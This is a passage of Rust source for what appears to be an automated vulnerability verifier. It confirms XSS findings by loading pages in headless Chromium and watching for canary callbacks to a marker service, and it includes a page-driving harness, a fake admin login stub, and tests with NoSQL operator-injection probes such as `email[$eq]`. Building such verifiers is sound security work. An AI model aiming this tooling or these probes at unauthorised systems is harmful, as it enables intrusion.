            .ok_or_else(|| format!("`{script}` has no file name"))?;
        let mut best: Option<(usize, String)> = None;
        for html in html_files(&self.root) {
            let Ok(text) = std::fs::read_to_string(&html) else {
                continue;
            };
            if !html_loads_script(&text, base) {
                continue;
            }
            let rel = html
                .strip_prefix(&self.root)
                .map(|p| p.to_string_lossy().replace('\\', "/"))
                .unwrap_or_default();
            let same_dir = usize::from(html.parent() == self.root.join(script_path).parent());
            if best.as_ref().is_none_or(|(s, _)| same_dir > *s) {
                best = Some((same_dir, format!("/{}", rel.trim_start_matches('/'))));
            }
        }
        best.map(|(_, page)| page).ok_or_else(|| {
            format!(
                "no HTML page loads `{base}` with a <script> tag (it may be bundled or an ES \
                 module behind the app entry; verify v1 drives directly-loadable pages)"
            )
        })
    }

    /// Every host page the harness pass should try, best first: the pages that load the script,
    /// ranked so a page the script names (its stem appears as a string literal in the script — the
    /// hint that the sink only runs on that page, e.g. `pg === 'entries'`) comes before a page in
    /// the script's own directory, before the rest. A sink gated on `location.pathname` only fires
    /// on the right page, and which page that is cannot be known ahead of time, so the candidates
    /// are driven in likelihood order rather than guessed at.
    fn find_pages(&self, script: &str) -> Vec<String> {
        let script_path = std::path::Path::new(script);
        if matches!(
            script_path.extension().and_then(|e| e.to_str()),
            Some("html" | "htm")
        ) {
            return vec![format!("/{}", script.trim_start_matches('/'))];
        }
        let Some(base) = script_path.file_name().and_then(|n| n.to_str()) else {
            return Vec::new();
        };
        let source = self.root.join(script_path);
        let source = std::fs::read_to_string(&source).unwrap_or_default();
        let same_parent = self.root.join(script_path).parent().map(|p| p.to_owned());
        let mut ranked: Vec<(u8, String)> = Vec::new();
        for html in html_files(&self.root) {
            let Ok(text) = std::fs::read_to_string(&html) else {
                continue;
            };
            if !html_loads_script(&text, base) {
                continue;
            }
            let rel = html
                .strip_prefix(&self.root)
                .map(|p| p.to_string_lossy().replace('\\', "/"))
                .unwrap_or_default();
            let stem = html.file_stem().and_then(|s| s.to_str()).unwrap_or("");
            // Rank 0: the script name-checks this page. Rank 1: same directory. Rank 2: rest.
            let rank = if !stem.is_empty() && script_names_page(&source, stem) {
                0
            } else if html.parent().map(std::path::Path::to_owned) == same_parent {
                1
            } else {
                2
            };
            ranked.push((rank, format!("/{}", rel.trim_start_matches('/'))));
        }
        ranked.sort_by(|a, b| a.0.cmp(&b.0).then_with(|| a.1.cmp(&b.1)));
        ranked.dedup_by(|a, b| a.1 == b.1);
        ranked.into_iter().map(|(_, page)| page).collect()
    }

    pub fn teardown(&mut self) {
        if self.torn_down {
            return;
        }
        self.torn_down = true;
        match &mut self.runtime {
            BrowserRuntime::Docker => {
                remove_container(&self.app);
                remove_container(&self.marker);
                remove_container(&self.browser);
                let _ = docker(&["network", "rm", &self.network]);
                let _ = docker(&["rmi", "-f", &self.tag]);
            }
            BrowserRuntime::Local {
                app,
                marker,
                helper_dir,
                ..
            } => {
                stop_local_process(app);
                stop_local_process(marker);
                let _ = std::fs::remove_dir_all(helper_dir);
            }
        }
    }
}

fn run_local_browser(
    executable: &std::path::Path,
    url: &str,
    referer: Option<&str>,
    helper_dir: &std::path::Path,
) -> Result<(), String> {
    let profile = helper_dir.join(format!("profile-{}", short_rand()));
    let mut command = Command::new(executable);
    command
        .arg("--headless=new")
        .arg("--no-sandbox")
        .arg("--disable-gpu")
        .arg("--disable-dev-shm-usage")
        .arg("--disable-background-networking")
        .arg("--virtual-time-budget=4000")
        .arg(format!("--user-data-dir={}", profile.display()))
        .arg("--dump-dom");
    if let Some(referer) = referer {
        command.arg(format!("--referer={referer}"));
    }
    command.arg(url).stdout(Stdio::null()).stderr(Stdio::null());
    let mut child = spawn_process_group(&mut command, "local headless browser")?;
    for _ in 0..120 {
        if child
            .try_wait()
            .map_err(|error| format!("waiting for local headless browser: {error}"))?
            .is_some()
        {
            let _ = std::fs::remove_dir_all(&profile);
            return Ok(());
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    stop_local_process(&mut child);
    let _ = std::fs::remove_dir_all(&profile);
    Err("local headless browser did not exit within 12s".to_owned())
}

/// Loads `url` in a headless browser and returns the rendered DOM (`--dump-dom`) after scripts have
/// run. Used by reflected-XSS verification to observe whether the injected script executed. A fresh
/// throwaway profile per load keeps each attempt independent; stdout is read on a thread so a large
/// DOM can never deadlock the wait.
fn run_local_browser_capture(
    executable: &std::path::Path,
    url: &str,
    helper_dir: &std::path::Path,
) -> Result<String, String> {
    use std::io::Read;
    let profile = helper_dir.join(format!("profile-{}", short_rand()));
    let mut command = Command::new(executable);
    command
        .arg("--headless=new")
        .arg("--no-sandbox")
        .arg("--disable-gpu")
        .arg("--disable-dev-shm-usage")
        .arg("--disable-background-networking")
        .arg("--virtual-time-budget=5000")
        .arg(format!("--user-data-dir={}", profile.display()))
        .arg("--dump-dom")
        .arg(url)
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    let mut child = spawn_process_group(&mut command, "local headless browser")?;
    let stdout = child.stdout.take();
    let reader = std::thread::spawn(move || {
        let mut buffer = String::new();
        if let Some(mut out) = stdout {
            let _ = out.read_to_string(&mut buffer);
        }
        buffer
    });
    let mut exited = false;
    for _ in 0..150 {
        if child
            .try_wait()
            .map_err(|error| format!("waiting for local headless browser: {error}"))?
            .is_some()
        {
            exited = true;
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    if !exited {
        stop_local_process(&mut child);
    }
    let dom = reader.join().unwrap_or_default();
    let _ = std::fs::remove_dir_all(&profile);
    if !exited {
        return Err("local headless browser did not exit within 15s".to_owned());
    }
    Ok(dom)
}

/// A one-line excerpt of the rendered DOM around the first occurrence of the canary's computed token,
/// for the reproduction's `response`: enough context to show the executed write in the page without
/// dumping the whole document.
fn reflected_dom_excerpt(dom: &str, token: &str) -> String {
    let Some(at) = dom.find(token) else {
        return String::new();
    };
    let start = dom[..at]
        .char_indices()
        .rev()
        .nth(120)
        .map_or(0, |(index, _)| index);
    let end = dom[at..]
        .char_indices()
        .nth(token.len() + 120)
        .map_or(dom.len(), |(index, _)| at + index);
    let window: String = dom[start..end]
        .chars()
        .map(|ch| if ch.is_whitespace() { ' ' } else { ch })
        .collect();
    format!(
        "…{}…",
        window.split_whitespace().collect::<Vec<_>>().join(" ")
    )
}

impl Drop for BrowserSession {
    fn drop(&mut self) {
        self.teardown();
    }
}

/// Builds the browser-phase image: the repo copied in, plus the static server, marker and browser
/// scripts. No `npm install` — the front end is served as it is in the repo.
fn build_browser_image(root: &std::path::Path, tag: &str, _port: u16) -> Result<(), String> {
    let context = root
        .to_str()
        .ok_or_else(|| "the repository path is not valid UTF-8".to_owned())?;
    // The Playwright image ships the browsers but not the `playwright` npm package; install the
    // matching version (browsers already present, so skip their download) into a fixed path and
    // point NODE_PATH at it. This is the only step that needs the network.
    let dockerfile = format!(
        "FROM {BROWSER_IMAGE}\n\
         WORKDIR /app\n\
         COPY . /app\n\
         RUN mkdir -p /opt/pw && cd /opt/pw && npm init -y >/dev/null 2>&1 && \
             PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD=1 npm install playwright@1.49.1 --no-audit --no-fund\n\
         RUN echo {} | base64 -d > /jss-serve.js\n\
         RUN echo {} | base64 -d > /jss-marker.js\n\
         RUN echo {} | base64 -d > /jss-browser.js\n\
         ENV NODE_PATH=/opt/pw/node_modules\n",
        base64(SERVE_JS.as_bytes()),
        base64(MARKER_JS.as_bytes()),
        base64(BROWSER_JS.as_bytes()),
    );
    build_from_dockerfile(&dockerfile, tag, context)
}

/// Whether an HTML document loads `base` with a `<script src>` tag (so a static load runs its
/// code): an occurrence of the file name preceded, within the same tag, by both `<script` and
/// `src`.
fn html_loads_script(text: &str, base: &str) -> bool {
    text.match_indices(base).any(|(idx, _)| {
        let start = idx.saturating_sub(300);
        let before = text.get(start..idx).unwrap_or("").to_ascii_lowercase();
        // `<script` must be the nearest opening tag, and a `src` attribute between it and here.
        match before.rfind("<script") {
            Some(tag) => before.get(tag..).unwrap_or("").contains("src"),
            None => false,
        }
    })
}

/// The list of `.html` files in a repo, skipping `node_modules` and dot-directories.
fn html_files(root: &std::path::Path) -> Vec<std::path::PathBuf> {
    fn walk(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>, depth: usize) {
        if depth > 12 || out.len() > 5000 {
            return;
        }
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if name.starts_with('.') || name == "node_modules" {
                continue;
            }
            if path.is_dir() {
                walk(&path, out, depth + 1);
            } else if matches!(
                path.extension().and_then(|e| e.to_str()),
                Some("html" | "htm")
            ) {
                out.push(path);
            }
        }
    }
    let mut out = Vec::new();
    walk(root, &mut out, 0);
    out
}

/// Host pages the harness pass drives at most, and attempts per page: enough to cover a page's real
/// parameter (mined names come first) across query and hash without turning one finding into a long
/// crawl.
const MAX_HARNESS_PAGES: usize = 10;
const MAX_HARNESS_ATTEMPTS_PER_PAGE: usize = 8;

/// The verified outcome for a browser probe whose canary reached the marker with `hit`, loaded via
/// `attempt_url` (the real page URL a victim opens — a harness wrapper, when used, is only our
/// driver and never appears here).
fn browser_verified(attempt_url: &str, hit: &str) -> Outcome {
    let public_url = replace_local_marker_url(attempt_url, hit, "http://CALLBACK_HOST");
    Outcome::Verified {
        how: format!("browser load {public_url}"),
        poc: Reproduction {
            command: format!(
                "Open {} in a browser",
                shell_quote(&format!("http://TARGET_HOST:3000{public_url}"))
            ),
            method: "BROWSER".to_owned(),
            target: public_url,
            headers: Vec::new(),
            body: None,
            evidence: format!("the isolated marker service received callback token `{hit}`"),
            response: String::new(),
            controls: Vec::new(),
        },
    }
}

/// The served URL that drives `attempt_url` through the harness, carrying the `localStorage` seeds.
/// Both values are whole-component percent-encoded so the harness recovers them exactly (the inner
/// payload keeps its own encoding, which the framed page decodes when it reads the parameter).
fn harness_url(attempt_url: &str, seeds_json: &str) -> String {
    format!(
        "/__jss/harness?p={}&s={}",
        encode_component(attempt_url),
        encode_component(seeds_json)
    )
}

/// A JSON array of `[key, value]` pairs for the harness to replay into `localStorage`.
fn seeds_json(seeds: &[(String, String)]) -> String {
    let mut out = String::from("[");
    for (i, (k, v)) in seeds.iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        out.push('[');
        json_string(&mut out, k);
        out.push(',');
        json_string(&mut out, v);
        out.push(']');
    }
    out.push(']');
    out
}

/// Appends `value` as a JSON string literal (quotes and the control characters that matter).
fn json_string(out: &mut String, value: &str) {
    out.push('"');
    for ch in value.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
}

/// Percent-encodes every byte outside the unreserved set, so an arbitrary URL (itself containing
/// `?`, `#`, `%`, `&`) survives as a single query-parameter value.
fn encode_component(text: &str) -> String {
    let mut out = String::with_capacity(text.len() * 3);
    for byte in text.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char)
            }
            _ => out.push_str(&format!("%{byte:02X}")),
        }
    }
    out
}

/// Whether `source` refers to a page by its stem as a quoted string literal (`'entries'`,
/// `"editor"`) — the signal that a DOM sink is gated to that page (`pathname` compared to the name).
fn script_names_page(source: &str, stem: &str) -> bool {
    source.contains(&format!("'{stem}'")) || source.contains(&format!("\"{stem}\""))
}

/// The `localStorage` feature flags an app sets for itself, mined from its scripts as
/// `localStorage.getItem('key') === 'value'` (or `==`) comparisons across the served tree. First
/// value seen per key wins; the scan is bounded and skips `node_modules`/dot-directories.
fn local_storage_flags(root: &std::path::Path) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for path in script_like_files(root).into_iter().take(400) {
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        mine_local_storage_flags(&text, &mut out);
    }
    out
}

/// Pushes each `localStorage.getItem('key') === 'value'` flag found in `text` into `out`, keeping
/// the first value seen per key.
fn mine_local_storage_flags(text: &str, out: &mut Vec<(String, String)>) {
    const NEEDLE: &str = "localStorage.getItem(";
    let bytes = text.as_bytes();
    let mut from = 0;
    while let Some(rel) = text[from..].find(NEEDLE) {
        let open = from + rel + NEEDLE.len();
        from = open;
        let Some((key, after_key)) = read_quoted(text, open) else {
            continue;
        };
        // Expect `)` then an equality operator then a quoted value.
        let mut i = after_key;
        while bytes.get(i).is_some_and(|b| b.is_ascii_whitespace()) {
            i += 1;
        }
        if bytes.get(i) != Some(&b')') {
            continue;
        }
        i += 1;
        while bytes.get(i).is_some_and(|b| b.is_ascii_whitespace()) {
            i += 1;
        }
        if !(text[i..].starts_with("===") || text[i..].starts_with("==")) {
            continue;
        }
        i += if text[i..].starts_with("===") { 3 } else { 2 };
        while bytes.get(i).is_some_and(|b| b.is_ascii_whitespace()) {
            i += 1;
        }
        let Some((value, _)) = read_quoted(text, i) else {
            continue;
        };
        if !key.is_empty() && !out.iter().any(|(k, _)| k == &key) {
            out.push((key, value));
        }
    }
}

/// Reads a single- or double-quoted string literal starting at `at` (the opening quote), returning
/// its unescaped-enough contents and the index just past the closing quote.
fn read_quoted(text: &str, at: usize) -> Option<(String, usize)> {
    let bytes = text.as_bytes();
    let quote = *bytes.get(at)?;
    if quote != b'\'' && quote != b'"' {
        return None;
    }
    let mut i = at + 1;
    let mut value = String::new();
    while let Some(&b) = bytes.get(i) {
        if b == b'\\' {
            if let Some(&n) = bytes.get(i + 1) {
                value.push(n as char);
                i += 2;
                continue;
            }
            return None;
        }
        if b == quote {
            return Some((value, i + 1));
        }
        if b == b'\n' {
            return None;
        }
        value.push(b as char);
        i += 1;
    }
    None
}

/// The `.js`/`.mjs`/`.cjs`/`.html` files under `root`, skipping `node_modules` and dot-directories,
/// bounded in breadth and depth. Used to mine client-side feature flags.
fn script_like_files(root: &std::path::Path) -> Vec<std::path::PathBuf> {
    fn walk(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>, depth: usize) {
        if depth > 12 || out.len() > 5000 {
            return;
        }
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if name.starts_with('.') || name == "node_modules" {
                continue;
            }
            if path.is_dir() {
                walk(&path, out, depth + 1);
            } else if matches!(
                path.extension().and_then(|e| e.to_str()),
                Some("js" | "mjs" | "cjs" | "html" | "htm")
            ) {
                out.push(path);
            }
        }
    }
    let mut out = Vec::new();
    walk(root, &mut out, 0);
    out
}

/// A static file server for the repo, dependency-free (core `http`).
///
/// Beyond serving files it offers two things the browser phase needs to drive single-page apps
/// whose vulnerable code runs only after the page is set up:
///   * `/__jss/harness` — a tiny driver page (same origin as the app, so it shares `localStorage`
///     and can reach into the frame it hosts). It seeds the `localStorage` flags passed in `s`,
///     loads the real page passed in `p` inside a frame, and then re-dispatches `popstate` /
///     `pushState` navigations at it, so a DOM sink reached only through a client-side route change
///     (a `popstate`/navigation handler, not module-load) still runs.
///   * a benign JSON stub for otherwise-missing `/api`, `/auth`, `/session`, `/graphql` requests,
///     with a signed-in `user`, so a client-side guard that redirects to a login page when its
///     `fetch('/api/auth/me')` returns nothing does not tear the page down before the sink runs.
///
/// Neither forges the finding: the real page is what renders, and only the app's own code writes
/// the canary into the DOM.
const SERVE_JS: &str = r#"
const http = require('http');
const fs = require('fs');
const path = require('path');
const root = path.resolve(process.argv[2] || '/app');
const port = Number(process.argv[3] || 3000);
const types = {'.html':'text/html','.htm':'text/html','.js':'text/javascript','.mjs':'text/javascript','.cjs':'text/javascript','.css':'text/css','.json':'application/json','.svg':'image/svg+xml','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.webp':'image/webp','.ico':'image/x-icon','.map':'application/json','.woff2':'font/woff2','.woff':'font/woff','.ttf':'font/ttf'};
const API_STUB = {ok:true,success:true,authenticated:true,loggedIn:true,isAuthenticated:true,user:{id:'1',name:'jss',username:'jss',email:'jss@example.test',role:'admin',roles:['admin']},data:[],items:[],results:[],collections:[],rows:[]};
const API_PREFIXES = ['/api/','/auth/','/session','/graphql','/oauth/'];
const HARNESS = `<!doctype html><meta charset="utf-8"><body><script>
(function(){
  var q = new URLSearchParams(location.search);
  try { (JSON.parse(q.get('s') || '[]')).forEach(function(kv){ localStorage.setItem(kv[0], kv[1]); }); } catch (e) {}
  var page = q.get('p') || '/';
  var f = document.createElement('iframe');
  f.style.cssText = 'position:fixed;left:0;top:0;width:100%;height:100%;border:0';
  f.src = page;
  document.body.appendChild(f);
  function kick(){
    try {
      var w = f.contentWindow; if (!w) return;
      try { w.history.pushState(null, '', w.location.href); } catch (e) {}
      try { w.dispatchEvent(new w.PopStateEvent('popstate')); }
      catch (e) { try { w.dispatchEvent(new PopStateEvent('popstate')); } catch (e2) {} }
      try { w.dispatchEvent(new w.Event('hashchange')); } catch (e) {}
    } catch (e) {}
  }
  f.addEventListener('load', function(){ setTimeout(kick, 100); setTimeout(kick, 500); setTimeout(kick, 1400); });
  setTimeout(kick, 900); setTimeout(kick, 2400);
})();
</script>`;
http.createServer((req, res) => {
  try {
    let p = decodeURIComponent(req.url.split('?')[0].split('#')[0]);
    if (p === '/__jss/harness') { res.writeHead(200, { 'Content-Type': 'text/html' }); return res.end(HARNESS); }
    let f = path.join(root, p);
    if (!f.startsWith(root)) { res.writeHead(403); return res.end('x'); }
    let st; try { st = fs.statSync(f); } catch (e) {
      if (API_PREFIXES.some(function(x){ return p.indexOf(x) !== -1; })) {
        let b = JSON.stringify(API_STUB);
        res.writeHead(200, { 'Content-Type': 'application/json' }); return res.end(b);
      }
      res.writeHead(404); return res.end('x');
    }
    if (st.isDirectory()) { f = path.join(f, 'index.html'); try { st = fs.statSync(f); } catch (e) { res.writeHead(404); return res.end('x'); } }
    res.writeHead(200, { 'Content-Type': types[path.extname(f).toLowerCase()] || 'application/octet-stream' });
    fs.createReadStream(f).pipe(res);
  } catch (e) { res.writeHead(500); res.end('x'); }
}).listen(port, '0.0.0.0');
"#;

/// Loads a URL in headless Chromium and lets any canary run. A canary that executes calls the
/// marker service; this script makes no assertion itself.
const BROWSER_JS: &str = r#"
const { chromium } = require('playwright');
(async () => {
  const url = process.argv[2];
  const referer = process.argv[3];
  const browser = await chromium.launch({ args: ['--no-sandbox', '--disable-dev-shm-usage'] });
  const context = await browser.newContext(referer ? { extraHTTPHeaders: { Referer: referer } } : {});
  const page = await context.newPage();
  page.on('dialog', d => { try { d.dismiss(); } catch (e) {} });
  page.on('pageerror', () => {});
  try { await page.goto(url, { waitUntil: 'load', timeout: 8000 }); } catch (e) {}
  try { await page.waitForTimeout(1200); } catch (e) {}
  try { await browser.close(); } catch (e) {}
  process.exit(0);
})();
"#;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn interrupted_local_fixtures_are_recognized_without_claiming_arbitrary_files() {
        let path = std::path::Path::new("/tmp/jss-canary-read.json");
        assert!(is_recognizable_local_fixture(
            path,
            br#""new-token""#,
            br#""18e885c6937a34481e587""#,
        ));
        assert!(!is_recognizable_local_fixture(
            path,
            br#""new-token""#,
            b"user data",
        ));
        assert!(is_recognizable_local_fixture(
            std::path::Path::new("/tmp/jss-driver.js"),
            b"known helper",
            b"known helper",
        ));
        assert!(!is_recognizable_local_fixture(
            std::path::Path::new("/tmp/jss-driver.js"),
            b"known helper",
            b"different helper",
        ));
    }

    #[test]
    fn standalone_npm_install_temporarily_drops_only_workspace_dev_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let manifest_path = dir.path().join("package.json");
        let original = br#"{
  "dependencies": { "runtime-sibling": "workspace:*", "fastify": "5.4.0" },
  "devDependencies": { "test-util": "workspace:*", "typescript": "5.6.3" }
}
"#;
        std::fs::write(&manifest_path, original).unwrap();

        let saved = prepare_standalone_npm_manifest(&manifest_path)
            .unwrap()
            .expect("workspace dev dependency is patched");
        let patched: serde_json::Value =
            serde_json::from_slice(&std::fs::read(&manifest_path).unwrap()).unwrap();
        assert_eq!(patched["dependencies"]["runtime-sibling"], "workspace:*");
        assert_eq!(patched["dependencies"]["fastify"], "5.4.0");
        assert!(patched["devDependencies"].get("test-util").is_none());
        assert_eq!(patched["devDependencies"]["typescript"], "5.6.3");
        assert_eq!(saved, original);
    }

    #[test]
    fn profiled_seed_script_discovers_queried_collections_and_cleans_up() {
        // The read-only NoSQL sink's collection is found from the profiler log, not guessed from a
        // name: resolve it from the command's own collection field, fall back to the `ns`, skip the
        // profiler's own collections, seed only empty ones, then turn profiling off and drop the log.
        let s = SEED_PROFILED_SCRIPT;
        assert!(s.contains("system.profile"), "reads the profiler log");
        assert!(s.contains("e.command.find"), "resolves a find namespace");
        assert!(
            s.contains("e.ns") && s.contains("split('.')"),
            "has an ns fallback"
        );
        assert!(
            s.contains("indexOf('system.')===0"),
            "skips profiler/system collections"
        );
        assert!(
            s.contains("countDocuments({})===0")
                && s.contains("insertOne(seeds[c])")
                && s.contains("{jss_seed:1}"),
            "seeds only empty collections, shaping the document from the observed filter"
        );
        assert!(
            s.contains("setProfilingLevel(0)")
                && s.contains("system.profile').drop()")
                && ENABLE_PROFILING_SCRIPT.contains("setProfilingLevel(2)"),
            "enables then disables profiling and drops its log"
        );
    }

    #[test]
    fn listening_probe_disambiguates_multiple_bound_ports_over_http() {
        // An app that fixes its own HTTP port and also stands up a WebSocket sidecar binds two ports;
        // the probe must still become ready by choosing the one that serves plain HTTP, not give up as
        // ambiguous. The requested `PORT` is still preferred when the app honors it.
        let s = listening_probe_excluding_candidates(3000, &[], &[]);
        assert!(
            s.contains("ports.has(3000)"),
            "prefers the requested PORT when present"
        );
        assert!(
            s.contains("GET / HTTP/1.0"),
            "probes each candidate with a plain HTTP request"
        );
        assert!(
            s.contains("'426'"),
            "skips a WebSocket-only endpoint that answers 426 Upgrade Required"
        );
        assert!(
            s.contains("MongoDB|native driver port"),
            "does not mistake MongoDB's HTTP diagnostic response for the application"
        );
        assert!(
            s.contains("const ready=direct?tcpOk:httpOk"),
            "requires HTTP on a discovered alternate port but retains the requested-port fallback"
        );
        assert!(
            s.contains("sort((a,b)=>a-b)"),
            "scans candidate ports in a deterministic order"
        );
        let local = listening_probe_excluding_candidates(3000, &[4000], &[8080]);
        assert!(local.contains("new Set([8080])"), "{local}");
        assert!(local.contains("new Set([4000])"), "{local}");
    }

    #[test]
    fn local_readiness_never_selects_marker_or_preexisting_service_ports() {
        assert_eq!(
            local_excluded_ports(&[3000, 4000], Some(44447), true, true),
            [3000, 4000, 6379, 27017, 44447]
        );
    }

    #[test]
    fn local_helper_path_translation_is_idempotent() {
        assert_eq!(
            localize_helper_paths("node /jss-driver.js /tmp/jss-canary-read.json"),
            "node /tmp/jss-driver.js /tmp/jss-canary-read.json"
        );
        assert_eq!(
            localize_helper_paths("node /tmp/jss-driver.js /tmp/jss-canary-read.json"),
            "node /tmp/jss-driver.js /tmp/jss-canary-read.json"
        );
        assert_eq!(
            localize_helper_paths("/jss-env/upload_dir"),
            "/tmp/jss-env/upload_dir"
        );
        assert_eq!(
            localize_helper_paths(
                "mkdir -p '/tmp/jss-canary-read.d/jss-del-token' && : > '/tmp/jss-canary-read.d/jss-del-token/jss-del-keep'"
            ),
            "mkdir -p '/tmp/jss-canary-read.d/jss-del-token' && : > '/tmp/jss-canary-read.d/jss-del-token/jss-del-keep'"
        );
    }

    #[test]
    fn local_sqlite_discovery_is_limited_to_app_owned_directories() {
        let env = vec![
            RequiredEnv {
                name: "APP_DATA_DIR".to_owned(),
                value: "/jss-env/app_data_dir".to_owned(),
                directory: true,
            },
            RequiredEnv {
                name: "API_TOKEN".to_owned(),
                value: "not-a-directory".to_owned(),
                directory: false,
            },
        ];
        assert_eq!(
            local_sqlite_search_roots(std::path::Path::new("/checkout/app"), &env),
            [
                "/checkout/app".to_owned(),
                "/tmp/jss-env/app_data_dir".to_owned(),
                "/tmp/jss-ws".to_owned(),
            ]
        );
    }

    #[test]
    fn binary_oracle_responses_are_not_exposed_as_report_text() {
        assert_eq!(
            response_excerpt("\u{fffd}PNG\0binary"),
            "[binary response omitted; 13 bytes captured]"
        );
        assert_eq!(
            response_excerpt("  readable response\n"),
            "readable response"
        );
    }

    #[test]
    fn differential_controls_preserve_the_request_and_bounded_response() {
        let attempt = Attempt {
            verb: "POST",
            target: "/users?email[$eq]=absent".to_owned(),
            body: Some(r#"{"tenant":"airqo"}"#.to_owned()),
            headers: Vec::new(),
            signal: Signal::InResponse,
        };
        let control = control_observation("match-none $eq", &attempt, &"x".repeat(500));
        assert_eq!(control.label, "match-none $eq");
        assert_eq!(control.method, "POST");
        assert_eq!(control.target, "/users?email[$eq]=absent");
        assert_eq!(control.body.as_deref(), Some(r#"{"tenant":"airqo"}"#));
        assert_eq!(control.response.len(), 400);
    }

    #[test]
    fn nosql_body_query_override_is_explicit_in_the_evidence() {
        let evidence = nosql_differential_evidence("user_id", true);
        assert!(evidence.contains("validator-compatible scalar `user_id`"));
        assert!(evidence.contains("{ ...request.body, ...request.query }"));
        assert!(!nosql_differential_evidence("user_id", false).contains("JSON body"));
    }

    #[test]
    fn module_stub_retry_only_accepts_bare_packages() {
        assert!(missing_bare_module(
            "Error: Cannot find module 'express'\nRequire stack: /app/index.js"
        ));
        assert!(missing_bare_module(
            "Error [ERR_MODULE_NOT_FOUND]: Cannot find package '@scope/plugin' imported from /app/index.mjs"
        ));
        assert!(!missing_bare_module(
            "Error: Cannot find module './local.js'"
        ));
        assert!(!missing_bare_module(
            "Error: Cannot find module '/app/local.js'"
        ));
        assert!(!missing_bare_module(
            "Error [ERR_MODULE_NOT_FOUND]: an import failed"
        ));
    }

    #[test]
    fn mongodb_collection_promise_retry_uses_the_exact_runtime_error() {
        let openwhyd = "TypeError: collections is not iterable\n\
            at exports.cacheCollections (/app/app/models/mongodb.js:72:22)\n\
            at async exports.initCollections (/app/app/models/mongodb.js:112:3)";
        assert!(missing_mongodb_collection_promise(openwhyd));
        assert!(missing_mongodb_collection_promise(
            "[db] Successfully connected to mongodb://127.0.0.1:27017/app\n\
             [app] error from main(): TypeError: collections is not iterable"
        ));
        assert!(missing_mongodb_collection_promise(
            "TypeError: collections is not iterable at renderCollections (/app/view.js:72:22)"
        ));
        assert!(!missing_mongodb_collection_promise(
            "Error: MongoDB connection failed at cacheCollections (/app/app/models/mongodb.js:72:22)"
        ));
    }

    #[test]
    fn a_missing_next_build_retries_the_repository_dev_server() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "package.json",
            r#"{"scripts":{"start":"node custom-server.js","dev":"next dev --webpack"}}"#,
        );
        let error = "Error: Could not find a production build in the '.next' directory. Try building your app with 'next build' before starting the production server.";
        assert!(missing_next_production_build(error));
        assert!(!missing_next_production_build(
            "Error: the application failed to build"
        ));
        assert_eq!(
            next_development_command(dir.path(), 20127),
            Some(vec![
                "npm".to_owned(),
                "run".to_owned(),
                "dev".to_owned(),
                "--".to_owned(),
                "--hostname".to_owned(),
                "127.0.0.1".to_owned(),
                "--port".to_owned(),
                "20127".to_owned(),
            ])
        );

        write(dir.path(), "package.json", r#"{"scripts":{"dev":"vite"}}"#);
        assert_eq!(next_development_command(dir.path(), 3000), None);
    }

    #[test]
    fn mongodb_collection_shim_follows_callback_and_promise_drivers() {
        if Command::new("node").arg("--version").output().is_err() {
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        // Production stages the ESM hook at `/jss-esm-hook.mjs`. This unit exercise only targets
        // the CommonJS MongoDB adapter, so keep Node from registering that unrelated absolute hook.
        write(
            dir.path(),
            "disable-register.js",
            "require('module').register = undefined;",
        );
        write(dir.path(), "launch-shim.js", LAUNCH_SHIM_JS);
        write(
            dir.path(),
            "app.js",
            "const { Db } = require('mongodb'); new Db().collections().then((xs) => console.log(xs[0]));",
        );
        for (implementation, expected) in [
            (
                "function Db() {}\nDb.prototype.collections = function (_, done) { done(null, ['callback']); };\nmodule.exports = { Db };",
                "callback",
            ),
            (
                "function Db() {}\nDb.prototype.collections = function () { return Promise.resolve(['promise']); };\nmodule.exports = { Db };",
                "promise",
            ),
        ] {
            write(dir.path(), "node_modules/mongodb/index.js", implementation);
            let output = Command::new("node")
                .arg("app.js")
                .current_dir(dir.path())
                .env("JSS_MONGODB_CALLBACK_PROMISES", "1")
                .env(
                    "NODE_OPTIONS",
                    format!(
                        "--require={} --require={}",
                        dir.path().join("disable-register.js").display(),
                        dir.path().join("launch-shim.js").display()
                    ),
                )
                .output()
                .unwrap();
            assert!(
                output.status.success(),
                "status={} stdout={} stderr={}",
                output.status,
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr),
            );
            assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), expected);
        }
    }

    #[test]
    fn worker_host_serves_a_vercel_node_req_res_function() {
        // The worker-host shim must run a Vercel *Node* serverless function — `(req, res)` reading
        // `req.query` and writing an Express-like `res` — not only a Web/edge `fetch` handler. Boot the
        // real shim against such a function and confirm it parses the query and returns the handler's
        // own JSON response through `res.status().json()`.
        if Command::new("node").arg("--version").output().is_err() {
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            "jss-worker-host.mjs",
            &String::from_utf8(local_helper_source(WORKER_HOST_JS)).unwrap(),
        );
        write(root, "jss-driver.js", &String::from_utf8(local_helper_source(DRIVER_JS)).unwrap());
        write(
            root,
            "api/proxy.js",
            "export default async function handler(req, res) {\n\
